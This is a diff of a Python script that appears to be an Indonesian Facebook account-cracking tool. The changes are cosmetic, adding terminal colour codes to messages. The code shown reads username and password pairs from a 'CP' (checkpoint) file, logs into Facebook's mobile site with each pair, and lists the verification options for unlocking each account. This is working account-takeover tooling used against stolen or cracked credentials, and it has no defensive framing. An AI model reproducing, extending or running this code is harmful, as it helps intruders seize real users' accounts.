@@ -366,26 +366,26 @@ def cekopsi():
 	dirs = os.listdir("CP")
 	print("")
 	for file in dirs:
-		print(" [*] CP/"+file)
-	print("\n [*] masukan file (ex: CP/%s.txt)"%(tanggal))
-	files = raw_input(" [?] nama file  : ")
+		print(" \x1b[1;92m[*] CP/"+file)
+	print("\n [*] \x1b[1;93mmasukan file (ex: CP/%s.txt)"%(tanggal))
+	files = raw_input(" \x1b[1;93m[?] nama file  : \x1b[1;92m")
 	if files == "":
 		menu()
 	try:
 		buka_baju = open(files, "r").readlines()
 	except IOError:
-		exit("\n [!] nama file %s tidak tersedia"%(files))
-	print('\n [!] anda bisa mematikan data selular untuk menjeda proses cek\n')
+		exit("\n \x1b[1;91m[!] nama file %s tidak tersedia"%(files))
+	print('\n \x1b[1;93m[!] anda bisa mematikan data selular untuk menjeda proses cek\n')
 	for memek in buka_baju:
 		kontol = memek.replace("\n","")
 		titid  = kontol.split("|")
-		print("\n [+] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
+		print("\n \x1b[1;93m[+] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
 		try:
 			check_in(titid[0].replace("  * --> ",""), titid[1])
 		except requests.exceptions.ConnectionError:
 			pass
-	print("\n [!] cek akun sudah selesai...")
-	raw_input(" [*] tekan enter untuk kembali ke menu ")
+	print("\n \x1b[1;93m[!] cek akun sudah selesai...")
+	raw_input(" \x1b[1;93m[*] tekan enter untuk kembali ke menu ")
 	time.sleep(1)
 	menu()
 	
@@ -433,7 +433,7 @@ def check_in(user, pasw):
 		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
 		ngew = [yy.text for yy in xnxx.find_all("option")]
 		if "Lihat detail login yang ditampilkan. Ini Anda?" in str(xnxx):
-			print("\r  🌟 %sTinggal 1 langkah lagi untuk membuka akun facebook. silahkan buka di browser%s"%(H,N))
+			print("\r  🌟 %s\x1b[1;93mTinggal 1 langkah lagi untuk membuka akun facebook. silahkan buka di browser%s"%(H,N))
 		else:
 			print(" [+] terdapat "+str(len(ngew))+" opsi ")
 			for opt in range(len(ngew)):
@@ -442,7 +442,7 @@ def check_in(user, pasw):
 		oh = run.find("div",{"id":"login_error"}).find("div").text
 		print(" [!] %s"%(oh))
 	else:
-		print(" [!] Setujui masuk anda dari telepon atau komputer lain")
+		print(" \x1b[1;92m[!] Account Yang anda login terkena Sesi/CheckPoint")
 
 ###GANTI USER AGENT###
 def seting_yntkts():
